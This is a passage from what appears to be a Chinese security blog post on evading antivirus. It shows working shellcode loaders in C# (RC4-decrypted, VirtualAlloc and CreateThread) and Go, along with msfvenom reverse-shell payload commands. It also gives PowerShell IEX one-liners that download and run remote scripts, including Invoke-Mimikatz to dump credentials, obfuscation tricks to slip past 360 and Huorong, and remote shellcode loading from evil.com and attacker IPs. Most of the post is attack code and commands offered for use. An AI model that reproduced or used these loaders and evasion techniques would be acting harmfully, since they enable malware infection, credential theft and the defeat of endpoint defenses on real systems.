+            <span class="hljs-keyword">byte</span>[] KEY = &#123; <span class="hljs-number">0x11</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> &#125;;
+            <span class="hljs-keyword">byte</span>[] MsfPayload = Decrypt(KEY, _X_to_Bytes);
+            <span class="hljs-comment">// 加载shellcode</span>
+            IntPtr returnAddr = VirtualAlloc((IntPtr)<span class="hljs-number">0</span>, (<span class="hljs-keyword">uint</span>)Math.Max(MsfPayload.Length, <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x3000</span>, <span class="hljs-number">0x40</span>);
+            Marshal.Copy(MsfPayload, <span class="hljs-number">0</span>, returnAddr, MsfPayload.Length);
+            CreateThread((IntPtr)<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, returnAddr, (IntPtr)<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (IntPtr)<span class="hljs-number">0</span>);
+            Thread.Sleep(<span class="hljs-number">2000</span>);
+        &#125;
+
+        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] <span class="hljs-title">Decrypt</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] key, <span class="hljs-keyword">byte</span>[] data</span>)</span>
+<span class="hljs-function"></span>        &#123;
+            <span class="hljs-keyword">return</span> EncryptOutput(key, data).ToArray();
+        &#125;
+        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] <span class="hljs-title">EncryptInitalize</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] key</span>)</span>
+<span class="hljs-function"></span>        &#123;
+            <span class="hljs-keyword">byte</span>[] s = Enumerable.Range(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>)
+              .Select(i =&gt; (<span class="hljs-keyword">byte</span>)i)
+              .ToArray();
+
+            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)
+            &#123;
+                j = (j + key[i % key.Length] + s[i]) &amp; <span class="hljs-number">255</span>;
+                Swap(s, i, j);
+            &#125;
+
+            <span class="hljs-keyword">return</span> s;
+        &#125;
+        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> IEnumerable&lt;<span class="hljs-keyword">byte</span>&gt; <span class="hljs-title">EncryptOutput</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] key, IEnumerable&lt;<span class="hljs-keyword">byte</span>&gt; data</span>)</span>
+<span class="hljs-function"></span>        &#123;
+            <span class="hljs-keyword">byte</span>[] s = EncryptInitalize(key);
+
+            <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;
+            <span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;
+
+            <span class="hljs-keyword">return</span> data.Select((b) =&gt;
+            &#123;
+                i = (i + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">255</span>;
+                j = (j + s[i]) &amp; <span class="hljs-number">255</span>;
+
+                Swap(s, i, j);
+
+                <span class="hljs-keyword">return</span> (<span class="hljs-keyword">byte</span>)(b ^ s[(s[i] + s[j]) &amp; <span class="hljs-number">255</span>]);
+            &#125;);
+        &#125;
+        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Swap</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] s, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j</span>)</span>
+<span class="hljs-function"></span>        &#123;
+            <span class="hljs-keyword">byte</span> c = s[i];
+
+            s[i] = s[j];
+            s[j] = c;
+        &#125;
+        [<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32.dll&quot;</span>)</span>]
+        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params">IntPtr lpAddress, <span class="hljs-keyword">uint</span> dwSize, <span class="hljs-keyword">uint</span> flAllocationType, <span class="hljs-keyword">uint</span> flProtect</span>)</span>;
+        [<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32.dll&quot;</span>)</span>]
+        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">CreateThread</span>(<span class="hljs-params">IntPtr lpThreadAttributes, <span class="hljs-keyword">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span class="hljs-keyword">uint</span> dwCreationFlags, IntPtr lpThreadId</span>)</span>;
+    &#125;
+&#125;</code></pre>
+
+<p>执行生成的exe,msf正常上线</p>
+<h4 id="3-XOR-AES编码shellcode"><a href="#3-XOR-AES编码shellcode" class="headerlink" title="3.XOR/AES编码shellcode"></a>3.XOR/AES编码shellcode</h4><p>先用msfvenom生成一个raw格式的shellcode</p>
+<pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.43.30 lport=3333  -f raw &gt; shellcode.raw</code></pre>
+
+<p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>se_null</code>为自己设置的key。</p>
+<pre><code class="hljs shell">python shellcode_encoder.py -cs shellcode.raw se_null xor</code></pre>
+
+<p>生成的<code>encryptedShellcodeWrapper_xor.cs</code>文件中的C#源码放在vs2019中编译运行即可。</p>
+<h3 id="2-加载器加载C-代码"><a href="#2-加载器加载C-代码" class="headerlink" title="2.加载器加载C#代码"></a>2.加载器加载C#代码</h3><h4 id="1-使用CSC-InstallUtil执行shellcode（VT-37-71-shell-exe不能过360）"><a href="#1-使用CSC-InstallUtil执行shellcode（VT-37-71-shell-exe不能过360）" class="headerlink" title="1.使用CSC+InstallUtil执行shellcode（VT:37/71  shell.exe不能过360）"></a>1.使用CSC+InstallUtil执行shellcode（VT:37/71  shell.exe不能过360）</h4><p>先通过msfvenom生成C＃的shellcode</p>
+<pre><code class="hljs c#">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i <span class="hljs-number">6</span> -b <span class="hljs-string">&#x27;\x00&#x27;</span> lhost=<span class="hljs-number">192.168</span><span class="hljs-number">.43</span><span class="hljs-number">.30</span> lport=<span class="hljs-number">3333</span> -f csharp</code></pre>
+
+<p>下载InstallUtil-Shellcode.cs</p>
+<pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/TideSec/</span>BypassAntiVirus<span class="hljs-regexp">/master/</span>tools/InstallUtil-Shellcode.cs</code></pre>
+
+<p>将上面生成的shellcode复制到<code>InstallUtil-Shellcode.cs</code>文件中。</p>
+<p>使用csc(以下.NET版本不是唯一可以执行的)编译InstallUtil-ShellCode.cs</p>
+<pre><code class="hljs latex">C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span>.NET<span class="hljs-tag">\<span class="hljs-name">Framework</span></span><span class="hljs-tag">\<span class="hljs-name">v</span></span>4.0.30319<span class="hljs-tag">\<span class="hljs-name">csc</span></span>.exe /unsafe /platform:x86 /out:C:<span class="hljs-tag">\<span class="hljs-name">test</span></span><span class="hljs-tag">\<span class="hljs-name">shell</span></span>.exe C:<span class="hljs-tag">\<span class="hljs-name">test</span></span><span class="hljs-tag">\<span class="hljs-name">InstallUtil</span></span>-ShellCode.cs</code></pre>
+
+<p>编译生成的shell.exe直接执行是不行的，需要使用InstallUtil.exe来触发。</p>
+<p>使用InstallUtil.exe执行shell.exe，360安全卫士会检测到InstallUtil.exe执行预警，360杀毒和火绒动态和静态均无预警。</p>
+<pre><code class="hljs shell">C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\test\shell.exe</code></pre>
+
+
+
+<h4 id="2-从资源里加载shelllcode"><a href="#2-从资源里加载shelllcode" class="headerlink" title="2.从资源里加载shelllcode"></a>2.从资源里加载shelllcode</h4><p>这里只介绍另外一种从资源里加载shelllcode的方法，不过很遗憾的是这个我没有复现成功。</p>
+<p>参考自三好学生大佬的文章:<code>https://wooyun.js.org/drops/CPL%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D.html</code></p>
+<p>需要用到这个工具<code>https://github.com/rvrsh3ll/CPLResourceRunner</code></p>
+<p>先用Cobalt Strike 生成shellcode</p>
+<pre><code class="hljs shell">Attacks -&gt; Packages -&gt; Windows Executable (s) -&gt; Output =&gt; RAW (x86)</code></pre>
+
+<p>然后用<code>ConvertShellcode.py</code>将生成的<code>beacon.bin</code>转换成<code>shellcode.txt</code></p>
+<pre><code class="hljs shell">python ConvertShellcode.py beacon.bin</code></pre>
+
+<p>然后再转换成base64编码。</p>
+<pre><code class="hljs shell">cat shellcode.txt |sed &#x27;s/[, ]//g; s/0x//g;&#x27; |tr -d &#x27;\n&#x27; |xxd -p -r |gzip -c |base64 &gt; b64shellcode.txt</code></pre>
+
+<p>把生成的base64编码的shellcode复制到项目资源<code>CPLResourceRunner/Resources.txt</code>里。</p>
+<p>编译生成dll，并将生成的<code>CPLResourceRunner.dll</code>重命名为<code>.cpl</code>文件，之后执行即可</p>
+<p>不过经过测试，无法上线，没找出来具体原因。</p>
+<p>msf生成spl木马</p>
+<pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp lhost=192.168.43.30 lport=3333  -f dll  &gt; shellcode.cpl</code></pre>
+
+<p>执行：</p>
+<p>(1) 双击直接运行</p>
+<p>(2) cmd下输入<code>rundll32 shell32.dll,Control_RunDLL &lt;文件名&gt;</code></p>
+<p>(3) cmd下输入<code>control &lt;文件名&gt;</code></p>
+<h2 id="4-powershell"><a href="#4-powershell" class="headerlink" title="4.powershell"></a>4.powershell</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Tw-FAduHMVzek_YxIErQDQ">https://mp.weixin.qq.com/s/Tw-FAduHMVzek_YxIErQDQ</a></p>
+<h3 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h3><h4 id="1-powershell版本问题"><a href="#1-powershell版本问题" class="headerlink" title="1.powershell版本问题"></a>1.powershell版本问题</h4><p>powershell只能针对win7之后的系统，之前的win操作系统默认没有安装powershell。不同架构的payload（x86或x64）需要不同版本的powershell来加载，否则会出错。</p>
+<p>64位所在目录：<code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code></p>
+<p>32位所在目录：<code>C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</code></p>
+<h4 id="2-常见执行方式"><a href="#2-常见执行方式" class="headerlink" title="2.常见执行方式"></a>2.常见执行方式</h4><p><strong>网络环境直接执行代码</strong></p>
+<p>无文件写入，相对较为隐蔽。下面代码为加载远程脚本<code>Invoke-Mimikatz.ps1</code>，执行Mimikatz的DumpCreds功能。</p>
+<pre><code class="hljs nginx"><span class="hljs-attribute">powershell</span> <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.211.55.2/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz -DumpCreds&quot;</span></code></pre>
+
+<p><strong>本地执行</strong></p>
+<p>先把<code>[http://10.211.55.2/Invoke-Mimikatz.ps1](http://10.211.55.2/Invoke-Mimikatz.ps1)</code>下载到本地</p>
+<p>然后导入<code>powershell Import-Module .\Invoke-Mimikatz.ps1</code></p>
+<p>使用命令<code>Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&#39;</code></p>
+<p>或者<code>Invoke-Mimikatz -DumpCreds</code></p>
+<h4 id="3-执行策略"><a href="#3-执行策略" class="headerlink" title="3.执行策略"></a>3.执行策略</h4><p>查看执行策略<code>powershell Get-ExecutionPolicy</code></p>
+<p>powershell有六种执行策略：</p>
+<pre><code class="hljs powershell">Unrestricted ：权限最高，可以不受限制执行任意脚本
+Restricted ：默认策略，不允许任意脚本的执行
+AllSigned ：所有脚本必须经过签名运行
+RemoteSigned ：本地脚本无限制，但是对来自网络的脚本必须经过签名
+Bypass ：没有任何限制和提示
+Undefined ：没有设置脚本的策略</code></pre>
+
+<p>默认情况下，禁止脚本执行。除非管理员更改执行策略。</p>
+<p><code>powershell Set-ExecutionPolicy Unrestricted</code>设置执行策略（需要管理员权限）</p>
+<p>绕过执行策略执行大概有以下几种：</p>
+<p><strong>本地读取然后通过管道符运行</strong></p>
+<pre><code class="hljs shell">powershell Get-Content 1.ps1 | powershell -NoProfile -</code></pre>
+
+<p><strong>远程下载并通过IEX运行脚本</strong></p>
+<pre><code class="hljs shell">powershell -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://47.94.80.129/ps/a.ps1&#x27;)&quot;</code></pre>
+
+<p><strong>Bypass执行策略绕过</strong></p>
+<pre><code class="hljs shell">powershell -ExecutionPolicy bypass -File ./a.ps1</code></pre>
+
+<p>不会显示警告和提示</p>
+<p><strong>Unrestricted执行策略标志</strong></p>
+<pre><code class="hljs shell">powershell -ExecutionPolicy unrestricted -File ./a.ps1</code></pre>
+
+<p>当运行一个从网上下载的未签名的脚本时，会给出权限提示</p>
+<p>需要解释的是：</p>
+<pre><code class="hljs shell">Invoke-Expression（IEX的别名）：用来把字符串当作命令执行。
+WindowStyle Hidden（-w Hidden）：隐藏窗口
+Nonlnteractive（-NonI）：非交互模式，PowerShell不为用户提供交互的提示。
+NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。
+Noexit（-Noe）：执行后不退出Shell。
+EncodedCommand（-enc）: 接受base64 encode的字符串编码，避免一些解析问题</code></pre>
+
+
+
+<h3 id="2-powershell加载shellcode方法"><a href="#2-powershell加载shellcode方法" class="headerlink" title="2.powershell加载shellcode方法"></a>2.powershell加载shellcode方法</h3><h4 id="1-msf-ps1本地执行-VT-20-59-过360"><a href="#1-msf-ps1本地执行-VT-20-59-过360" class="headerlink" title="1.msf-ps1本地执行(VT:20/59 过360)"></a>1.msf-ps1本地执行(VT:20/59 过360)</h4><p>用msfvenom生成powershell马，注意这里是<code>-f psh</code></p>
+<pre><code class="hljs shell">msfvenom -p  windows/x64/meterpreter/reverse_https -e x86/shikata_ga_nai -i 15 -b &#x27;\x00&#x27; lhost=192.168.43.30 lport=3333 -f psh -o shell.ps1</code></pre>
+
+<p>将shell.ps1拷贝到测试机器上，本地执行。</p>
+<pre><code class="hljs shell">powershell.exe -ExecutionPolicy Bypass -NoExit -File  shell.ps1</code></pre>
+
+
+
+<h4 id="2-Invoke-Shellcode加载（VT-shell-ps1-0-59）"><a href="#2-Invoke-Shellcode加载（VT-shell-ps1-0-59）" class="headerlink" title="2.Invoke-Shellcode加载（VT:shell.ps1-0/59）"></a>2.Invoke-Shellcode加载（VT:shell.ps1-0/59）</h4><p>先用msfvenom生成脚本木马</p>
+<pre><code class="hljs shell">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.43.30 LPORT=3333 -f powershell -o shell.ps1</code></pre>
+
+<p>在目标机器上执行</p>
+<pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)
+<span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.43.30/shell.ps1&quot;</span>)
+<span class="hljs-built_in">Invoke-Shellcode</span> <span class="hljs-literal">-Shellcode</span> (<span class="hljs-variable">$buf</span>) <span class="hljs-literal">-Force</span>  运行木马</code></pre>
+
+
+
+<h4 id="3-Invoke-Obfuscation对ps1免杀-VT-4-58"><a href="#3-Invoke-Obfuscation对ps1免杀-VT-4-58" class="headerlink" title="3.Invoke-Obfuscation对ps1免杀    (VT:4/58)"></a>3.Invoke-Obfuscation对ps1免杀    (VT:4/58)</h4><p>powershell的免杀方法有很多，对代码进行编码是最常见的一种，这里介绍一个专门用来对powershell进行编码免杀的框架Invoke-Obfuscation，这也是著名的APT32组织海莲花常用的一个工具。</p>
+<p>Invoke-Obfuscation主要是对ps1脚本进行免杀，所以这里还是需要现有一个ps的payload，我还是用法1的msf生成的payload。</p>
+<p>下载<code>Invoke-Obfuscation</code>：<code>git clone https://github.com/danielbohannon/Invoke-Obfuscation</code></p>
+<p>进入Invoke-Obfuscation目录，在powershell中执行<code>Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation</code></p>
+<p>然后执行<code>set scriptpath c:\test\shell.ps1</code> 指定待处理的Ps1文件，或者<code>set scriptblock &#39;echo xss&#39;</code>指定待处理的ps代码</p>
+<p>然后输入<code>encoding</code>，再选择编码方式，比如1</p>
+<p>然后执行<code>out c:\test\jiami.ps1</code>即可输出处理好的ps1文件.</p>
+<p>本地执行可上线<code>powershell.exe -ExecutionPolicy Bypass -NoExit -File c:\test\jiami.ps1</code></p>
+<h4 id="4-ps1行为免杀"><a href="#4-ps1行为免杀" class="headerlink" title="4.ps1行为免杀"></a>4.ps1行为免杀</h4><p>虽然ps1代码自身免杀，但在用powershell执行远程下载或执行shellcode时，很容易触发杀软行为规则。</p>
+<p>对于IEX这种方便快捷的方式直接运行会被360拦截。可尝试从语法上简单变化。主要是对DownloadString、http做一些处理。</p>
+<p>比如利用replace替换函数，可以bypass。</p>
+<pre><code class="hljs csp">powershell -NoExit &quot;$c1=<span class="hljs-string">&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;</span>;$c2=<span class="hljs-string">&#x27;123(&#x27;</span><span class="hljs-string">&#x27;http://192.168.43.30/shell.ps1&#x27;</span><span class="hljs-string">&#x27;)&#x27;</span>.Replace(<span class="hljs-string">&#x27;123&#x27;</span>,<span class="hljs-string">&#x27;adString&#x27;</span>);IEX ($c1+$c2)&quot;</code></pre>
+
+<p>可过360和火绒</p>
+<h2 id="5-go"><a href="#5-go" class="headerlink" title="5.go"></a>5.go</h2><p>目标机器不一定有go环境，且go编译出来的exe大约2.3M左右，使用upx压缩下大约1.5M,不过相比python编译的exe应该还能接受了，免杀效果还比python-exe要好一些。</p>
+<h3 id="1-Go嵌入shellcode"><a href="#1-Go嵌入shellcode" class="headerlink" title="1.Go嵌入shellcode"></a>1.Go嵌入shellcode</h3><p>先用msfvenom生成C语言的shellcode，注意要生成x64的。</p>
+<pre><code class="hljs shell">msfvenom -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.43.30 lport=3333 -f c</code></pre>
+
+<p>将shellcode转换成16进制的形式例如：\xfc-&gt;0xfc</p>
+<p>将转换后的shellcode替换到下面的<code>shellcode_buf</code>位置，文件保存为<code>shell.go</code></p>
+<pre><code class="hljs go"><span class="hljs-keyword">package</span> main
+
+<span class="hljs-keyword">import</span> (
+    <span class="hljs-string">&quot;io/ioutil&quot;</span>
+    <span class="hljs-string">&quot;os&quot;</span>
+    <span class="hljs-string">&quot;syscall&quot;</span>
+    <span class="hljs-string">&quot;unsafe&quot;</span>
+)
+
+<span class="hljs-keyword">const</span> (
+    MEM_COMMIT             = <span class="hljs-number">0x1000</span>
+    MEM_RESERVE            = <span class="hljs-number">0x2000</span>
+    PAGE_EXECUTE_READWRITE = <span class="hljs-number">0x40</span>
+)
+
+<span class="hljs-keyword">var</span> (
+    kernel32       = syscall.MustLoadDLL(<span class="hljs-string">&quot;kernel32.dll&quot;</span>)
+    ntdll          = syscall.MustLoadDLL(<span class="hljs-string">&quot;ntdll.dll&quot;</span>)
+    VirtualAlloc   = kernel32.MustFindProc(<span class="hljs-string">&quot;VirtualAlloc&quot;</span>)
+    RtlCopyMemory  = ntdll.MustFindProc(<span class="hljs-string">&quot;RtlCopyMemory&quot;</span>)
+    shellcode_buf = []<span class="hljs-keyword">byte</span>&#123; 
+        <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x48</span>,  ----shellcode----, <span class="hljs-number">0xd5</span>,
+    &#125;
+)
+
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkErr</span><span class="hljs-params">(err error)</span></span> &#123;
+    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
+        <span class="hljs-keyword">if</span> err.Error() != <span class="hljs-string">&quot;The operation completed successfully.&quot;</span> &#123;
+            <span class="hljs-built_in">println</span>(err.Error())
+            os.Exit(<span class="hljs-number">1</span>)
+        &#125;
+    &#125;
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;
+    shellcode := shellcode_buf
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(os.Args) &gt; <span class="hljs-number">1</span> &#123;
+        shellcodeFileData, err := ioutil.ReadFile(os.Args[<span class="hljs-number">1</span>])
+        checkErr(err)
+        shellcode = shellcodeFileData
+    &#125;
+
+    addr, _, err := VirtualAlloc.Call(<span class="hljs-number">0</span>, <span class="hljs-keyword">uintptr</span>(<span class="hljs-built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+    <span class="hljs-keyword">if</span> addr == <span class="hljs-number">0</span> &#123;
+        checkErr(err)
+    &#125;
+    _, _, err = RtlCopyMemory.Call(addr, (<span class="hljs-keyword">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="hljs-number">0</span>])), <span class="hljs-keyword">uintptr</span>(<span class="hljs-built_in">len</span>(shellcode)))
+    checkErr(err)
+    syscall.Syscall(addr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
+&#125;</code></pre>
+
+<p>安装golang，参考：<code>[https://www.runoob.com/go/go-environment.html](https://www.runoob.com/go/go-environment.html)</code></p>
+<p>在命令行执行命令<code>go build</code>，编译生成<code>test.exe</code>，在测试机执行。不过大约两分钟后，360安全大脑提示云查杀报警了。</p>
+<p>在网上还找到另外一个代码，不过执行和编译老出错，有兴趣的可以试一下，代码如下。</p>
+<pre><code class="hljs go"><span class="hljs-keyword">package</span> main
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;C&quot;</span>
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;unsafe&quot;</span>
+
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;
+    buf := <span class="hljs-string">&quot;&quot;</span>
+    buf += <span class="hljs-string">&quot;xddxc6xd9x74x24xf4x5fx33xc9xb8xb3x5ex2c&quot;</span>
+    ...省略...
+    buf += <span class="hljs-string">&quot;xc9xb1x97x31x47x1ax03x47x1ax83xc7x04xe2&quot;</span>
+    <span class="hljs-comment">// at your call site, you can send the shellcode directly to the C</span>
+    <span class="hljs-comment">// function by converting it to a pointer of the correct type.</span>
+    shellcode := []<span class="hljs-keyword">byte</span>(buf)
+    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[<span class="hljs-number">0</span>])))
+&#125;</code></pre>
+
+
+
+<h3 id="2-Go加载器"><a href="#2-Go加载器" class="headerlink" title="2.Go加载器"></a>2.Go加载器</h3><h4 id="1-go-shellcode加载器-VT查杀率4-69"><a href="#1-go-shellcode加载器-VT查杀率4-69" class="headerlink" title="1.go-shellcode加载器(VT查杀率4/69)"></a>1.go-shellcode加载器(VT查杀率4/69)</h4><p>需要先下载加载器：<code>https://github.com/brimstone/go-shellcode</code></p>
+<p>下载后，进入<code>go-shellcode\cmd\sc</code>目录，执行<code>go build</code>(cmd下即可)生成<code>sc.exe</code></p>
+<p>然后用Msfvenom生成hex格式的shellcode</p>
+<pre><code class="hljs shell">msfvenom -p windows/x64/meterpreter/reverse_tcp -f hex -o shell.hex LHOST=192.168.43.30 LPORT=3333</code></pre>
+
+<p>使用sc加载器进行加载</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">sc</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">shellcode</span></code></pre>
+
+
+
+<h4 id="2-gsl加载器"><a href="#2-gsl加载器" class="headerlink" title="2.gsl加载器"></a>2.gsl加载器</h4><p>gsl是<code>Jayl1n</code>根据go-shellcode进行了修改完善的工具。</p>
+<p>下载gsl加载器：<code>wget https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/gsl-sc-loader.zip</code></p>
+<p>包含两个版本，x86和x64。提供了三种加载方式</p>
+<p>1、从参数传入 （必须是HEX格式）</p>
+<pre><code class="hljs autoit">gsl -s SHELLCODE -<span class="hljs-built_in">hex</span></code></pre>
+
+<p>2、从文件传入</p>
+<p>加载 RAW 格式：<code>gsl -f shell.raw</code></p>
+<p>加载 HEX 格式：<code>gsl -f shell.hex -hex</code></p>
+<p>3、从远程服务器加载</p>
+<p>把 SHELLCODE 文件挂在WEB目录下。（支持HTTP/HTTPS）</p>
+<p>加载 RAW 格式：<code>gsl -u [http://evil.com/shell.raw](http://evil.com/shell.raw)</code></p>
+<p>加载 HEX 格式：<code>gsl -u [http://evil.com/shell.hex](http://evil.com/shell.hex) -hex</code></p>
+<p>以x64为例进行测试，先生成x64的shellcode</p>
+<pre><code class="hljs shell">msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=10.211.55.2 LPORT=3333 -f hex -o shell.hex</code></pre>
+
+<p>试一下远程加载<code>gsl64.exe -u http://192.168.43.30/shell.hex -hex</code>即可上线</p>
+<p>更多免杀参考：<a target="_blank" rel="noopener" href="https://github.com/TideSec/BypassAntiVirus/">https://github.com/TideSec/BypassAntiVirus/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/C-C-%E4%B9%8B11%E7%A7%8D%E6%96%B9%E6%B3%95%E5%85%8D%E6%9D%80/">C/C++之11种方法免杀</a>
+                    
+                      <a class="hover-with-bg" href="/tags/python%E4%B9%8B7%E7%A7%8D%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95/">python之7种免杀方法</a>
+                    
+                      <a class="hover-with-bg" href="/tags/c-%E4%B9%8B5%E7%A7%8D%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95/">c#之5种免杀方法</a>
+                    
+                      <a class="hover-with-bg" href="/tags/powershell%E4%B9%8B4%E7%A7%8D%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95/">powershell之4种免杀方法</a>
+                    
+                      <a class="hover-with-bg" href="/tags/go%E4%B9%8B3%E7%A7%8D%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95/">go之3种免杀方法</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">免杀文档制作</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/03/%E5%85%8D%E6%9D%80%E4%B8%80-%E5%B7%A5%E5%85%B7%E5%85%8D%E6%9D%80/">
+                        <span class="hidden-mobile">免杀一-工具免杀</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
